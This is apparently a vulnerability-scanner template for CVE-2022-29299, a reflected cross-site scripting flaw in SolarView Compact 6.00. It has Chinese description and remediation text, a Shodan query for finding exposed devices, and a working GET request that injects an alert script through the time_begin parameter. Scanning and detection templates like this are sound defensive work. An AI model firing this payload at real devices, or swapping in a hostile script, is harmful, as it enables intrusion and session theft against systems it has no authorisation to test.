id: solarview-compact-time-begin-xss

info:
  name: SolarView Compact 6.00 - 跨站脚本漏洞（CVE-2022-29299）
  author: For3stCo1d
  severity: medium
  description: |-
    SolarView Compact 6.00 存在安全漏洞。攻击者可通过 /Solar_History.php?time_begin=xx%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22 的 time_begin, time_end, event_level 参数 注入恶意脚本，并在受害者浏览器上下文中执行任意 JavaScript。该模板通过请求 /Solar_History.php?time_begin=xx%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22，并结合响应中的 <script>alert(document.domain)</script><"">、/Solar_History.php" METHOD="post">、text/html 等特征进行验证。
  impact: |-
    - 攻击者可在受害者浏览器中执行恶意脚本，导致会话劫持、页面篡改或敏感信息窃取。
    - 若漏洞位于后台或高权限页面，还可能被用于冒充受害者执行管理操作。
  remediation: |-
    - 尽快将 SolarView Compact 6.00 升级到厂商已发布的修复版本，并结合官方公告核对受影响版本范围。
    - 对所有可控输入执行严格过滤与输出编码，避免未经过滤的脚本、HTML 标签或事件处理器进入页面响应。
  reference:
    - https://www.exploit-db.com/exploits/50967
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29299
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    epss-score: 0.00175
    epss-percentile: 0.5456
    cpe: cpe:2.3:o:contec:solarview_compact_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:-244067125
    product: solarview_compact_firmware
    vendor: contec
  tags: xss,solarview,edb,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/Solar_History.php?time_begin=xx%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&time_end=&event_level=0&event_pcs=1&search_on=on&search_off=on&word=hj%27&sort_type=0&record=10&command=%95%5C%8E%A6'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert(document.domain)</script><"">'
          - '/Solar_History.php" METHOD="post">'
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
